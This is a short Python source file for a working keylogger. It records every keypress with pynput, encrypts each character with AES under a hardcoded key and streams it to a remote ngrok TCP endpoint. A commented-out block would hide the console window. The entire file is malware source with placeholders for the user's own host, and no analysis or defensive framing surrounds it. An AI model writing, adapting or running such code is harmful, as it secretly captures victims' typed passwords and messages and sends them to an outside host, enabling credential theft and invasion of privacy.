from pwn import *
from pynput import keyboard
import win32gui
import win32con
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

super_secret_key = b'super_secret_key'
cipher = AES.new(super_secret_key, AES.MODE_ECB)

HOST = '0.tcp.eu.ngrok.io' # Your tcp host
PORT = 1234 # Your tcp open port

'''hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)'''

c = remote(HOST, PORT)

def keyPressed(key):
    try:
        char = key.char
        c.sendline(cipher.encrypt(pad(char.encode(), 16)))
    except:
        pass

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
